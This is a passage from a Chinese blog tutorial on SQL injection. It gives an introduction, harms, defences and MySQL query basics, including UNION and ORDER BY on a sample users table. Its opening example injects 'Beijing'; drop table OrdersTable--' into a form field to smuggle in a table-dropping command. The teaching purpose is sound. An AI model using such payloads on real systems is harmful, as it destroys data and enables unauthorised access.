<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Web,">





  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">






<meta name="description" content="“SQL注入涉及两个条件： 首先用户能够控制输入，其次是原本程序要执行的代码，拼接了用户输入的数据。”">
<meta name="keywords" content="Web">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL 注入">
<meta property="og:url" content="https://www.lintstar.top/2020/08/35cb7ca5.html">
<meta property="og:site_name" content="离沫凌天๓">
<meta property="og:description" content="“SQL注入涉及两个条件： 首先用户能够控制输入，其次是原本程序要执行的代码，拼接了用户输入的数据。”">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://dn-coding-net-tweet.codehub.cn/photo/2019/e13f866e-3f89-4cb8-b8f8-962814555b20.jpg">
<meta property="og:image" content="https://dn-coding-net-tweet.codehub.cn/photo/2019/8a6db6e0-e26d-496f-b939-fab5711ca81a.jpg">
<meta property="og:image" content="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555994572407.png">
<meta property="og:image" content="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/image-20200510151630128.png">
<meta property="og:image" content="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555996943051.png">
<meta property="og:image" content="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555997320108.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200510172820746.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200510195616110.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200510213353530.png">
<meta property="og:image" content="https://image.3001.net/images/20200527/15905836509224.png">
<meta property="og:image" content="https://image.3001.net/images/20200527/1590584240851.png">
<meta property="og:image" content="https://image.3001.net/images/20200527/15905847152255.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15893696834265.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15893833852620.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15894186942757.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15894228024343.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15894229147799.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/1589426073817.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15895151791144.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15901641643476.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15897015756622.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15897218466276.png">
<meta property="og:image" content="http://qiniuyun.lintstar.top/15897680165097.png">
<meta property="og:updated_time" content="2020-09-01T16:07:43.045Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SQL 注入">
<meta name="twitter:description" content="“SQL注入涉及两个条件： 首先用户能够控制输入，其次是原本程序要执行的代码，拼接了用户输入的数据。”">
<meta name="twitter:image" content="https://dn-coding-net-tweet.codehub.cn/photo/2019/e13f866e-3f89-4cb8-b8f8-962814555b20.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.lintstar.top/2020/08/35cb7ca5.html">





  <title>SQL 注入 | 离沫凌天๓</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">离沫凌天๓</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.lintstar.top/2020/08/35cb7ca5.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="离沫凌天๓">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="离沫凌天๓">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">SQL 注入</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-13T22:00:00+08:00">
                2020-08-13
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  34k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  148
                </span>
              
            </div>
          

          
              <div class="post-description">
                  “SQL注入涉及两个条件： 首先用户能够控制输入，其次是原本程序要执行的代码，拼接了用户输入的数据。”
              </div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p><strong>注入攻击是 Web 安全领域中一种最为常见的攻击方式。</strong></p>
<p>XSS 本质上也是一种针对 HTML 的注入攻击。</p>
<p>注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件:</p>
<ul>
<li><strong>用户能够控制输入</strong></li>
<li><strong>原本程序要执行的代码，拼接了用户输入的数据。</strong></li>
</ul>
<h1 id="SQL-注入攻击简介"><a href="#SQL-注入攻击简介" class="headerlink" title="SQL 注入攻击简介"></a>SQL 注入攻击简介</h1><p>在今天，SQL 注入对于开发者来说，应该是耳熟能详了。而 SQL 注入第一次为公众所知，是在 1998 年的著名黑客杂志《Phrack》第 54 期上，一位名叫rfp的黑客发表了一篇题为 “NT Web Tech-nology Vulnerabilities” 的文章。</p>
<p>一个 SQL 注入的典型例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Shipcity;</span><br><span class="line">ShipCity = Request.form (<span class="string">"ShipCity"</span>);</span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select * from OrdersTable where ShipCity = '"</span> + ShipCity + <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
<p>变量 ShipCity 的值由用户提交，在正常情况下，假如用户输入<code>Beijing</code>，那么SQL语句会执行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OrdersTable <span class="keyword">WHERE</span> ShipCity = <span class="string">'Beijing'</span></span><br></pre></td></tr></table></figure>
<p>但假如用户输入一段有语义的 SQL 语句，比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Beijing'; <span class="keyword">drop</span> <span class="keyword">table</span> OrdersTable<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>那么，SQL 语句在实际执行时就会如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OrdersTable <span class="keyword">WHERE</span> ShipCity = <span class="string">'Beijing'</span>;<span class="keyword">drop</span> <span class="keyword">table</span> OrdersTable<span class="comment">--'</span></span><br></pre></td></tr></table></figure>
<p>原本正常执行的查询语句，现在变成了查询完后，再执行一个drop表的操作，而这个操作，是用户构造了恶意数据的结果。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
<li><strong>未授权访问数据库中数据，造成用户信息泄露</strong></li>
<li><strong>对数据库数据进行敏感操作，私自添加删除管理员账号</strong></li>
<li><strong>如果网站目录存在写入权限，可以写入网页木马</strong></li>
<li><strong>读取文件获取webshell</strong></li>
</ol>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li><strong>不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双引号进行转换等。</strong></li>
<li><strong>不要使用动态拼接 SQL，可以考虑使用存储过程进行数据查询存取，例如 Django 自带的 Model。</strong></li>
<li><strong>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装。</strong></li>
<li><strong>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</strong></li>
<li><strong>不要把机密信息直接存放，对密码等敏感的信息进行加密。</strong></li>
</ol>
<h1 id="MySQL-基础"><a href="#MySQL-基础" class="headerlink" title="MySQL 基础"></a>MySQL 基础</h1><p>MySQL 是最流行的关系型数据库管理系统，市场占有率比较高，在 CTF 比赛中也经常出现。</p>
<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul>
<li><strong>数据库:</strong> 数据库是一些关联表的集合。</li>
<li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li>
</ul>
<p>数据表由 行（row）和 列 (column)组成，是一个二维的网格结构，每个列都是一个字段。</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><strong>创建数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> 数据库名;</span><br></pre></td></tr></table></figure>
<p><strong>删除数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> 数据库名;</span><br></pre></td></tr></table></figure>
<p><strong>查询所有数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
<p><strong>选择数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名;</span><br></pre></td></tr></table></figure>
<p><strong>查询数据库下的表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
<p><strong>创建数据表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`tbl`</span>(</span><br><span class="line">   <span class="string">`id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> AUTO_INCREMENT,</span><br><span class="line">   <span class="string">`title`</span> <span class="built_in">VARCHAR</span>(<span class="number">500</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`author`</span> <span class="built_in">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> ( <span class="string">`id`</span> )</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure>
<p><strong>删除表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 数据表名;</span><br></pre></td></tr></table></figure>
<p><strong>插入数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"你看得到我打在屏幕上的字，看不到我落在键盘上的泪。"</span>, <span class="string">"画船听雨"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"成功的花，人们只惊羡她现时的明艳！然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。"</span>, <span class="string">"冰心"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"The quieter you become, the more you are able to hear"</span>, <span class="string">"Kali Linux"</span>);</span><br></pre></td></tr></table></figure>
<p><strong>更新语句</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> tbl <span class="keyword">set</span> title=<span class="string">'好好学习 天天向上'</span> <span class="keyword">WHERE</span> author=<span class="string">'画船听雨'</span>;</span><br></pre></td></tr></table></figure>
<p><strong>删除数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tbl <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>可以直接使用 select 查询任意字符串或者函数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 'Hello World';</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| Hello World |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| Hello World |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>也可以带入相关的函数查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user(),version(),database();</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">| user()           | version() | database() |</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">| root@10.211.55.2 | 5.5.53    | test       |</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>也可以查询数据表中的信息：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl;              <span class="comment">-- 所有值</span></span><br><span class="line"><span class="keyword">select</span> title <span class="keyword">from</span> tbl;          <span class="comment">-- 查询title的值</span></span><br><span class="line"><span class="keyword">select</span> author <span class="keyword">from</span> tbl;         <span class="comment">-- 查询author的值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,author <span class="keyword">from</span> tbl; <span class="comment">-- 等同于 * 查询</span></span><br></pre></td></tr></table></figure>
<p><strong>条件查询</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> author <span class="keyword">from</span> tbl <span class="keyword">where</span> anthor=<span class="string">'冰心'</span>; <span class="comment">#查询作者为冰心的内容</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>默认是无法区分大小写的，如果要区分大小的的话，只需要在 where 的后面加个 binary 就可以了</p>
</blockquote>
<p><strong>like 模糊查询</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl  <span class="keyword">where</span> author <span class="keyword">like</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>默认是无法区分大小写的，如果要区分大小的的话，只需要在 like 的后面加个 binary 就可以了</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl  <span class="keyword">where</span> author <span class="keyword">like</span> <span class="built_in">binary</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure>
<p><strong>union 联合查询</strong></p>
<p>连接两个以上的 SELECT 语句的结果组合到一个结果集合中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select version(),database(),user();</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">| id     | username | password         |</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">| 1      | Dumb     | Dumb             |</span><br><span class="line">| 2      | Angelina | I-kill-you       |</span><br><span class="line">| 3      | Dummy    | p@ssword         |</span><br><span class="line">| 4      | secure   | crappy           |</span><br><span class="line">| 5      | stupid   | stupidity        |</span><br><span class="line">| 6      | superman | genious          |</span><br><span class="line">| 7      | batman   | mob!le           |</span><br><span class="line">| 8      | admin    | admin            |</span><br><span class="line">| 9      | admin1   | admin1           |</span><br><span class="line">| 10     | admin2   | admin2           |</span><br><span class="line">| 11     | admin3   | admin3           |</span><br><span class="line">| 12     | dhakkan  | dumbo            |</span><br><span class="line">| 14     | admin4   | admin4           |</span><br><span class="line">| 5.5.53 | security | root@10.211.55.2 |</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">14 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>思考：这条语句如果这样写呢？</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
<p>结果就会报错，因为第三列空了</p>
<p><strong>order by 排序</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照id升序排序</span></span><br><span class="line">select * from users order by id asc;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照id降序排序</span></span><br><span class="line">select * from users order by id desc;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据第1个字段排序</span></span><br><span class="line">mysql&gt; select * from users order by 1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据第2个字段排序</span></span><br><span class="line">mysql&gt; select * from users order by 2;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
<p><strong>group by 分组排序</strong></p>
<p>假设有如下数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | singin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br></pre></td></tr></table></figure>
<p>使用分组查询语句：</p>
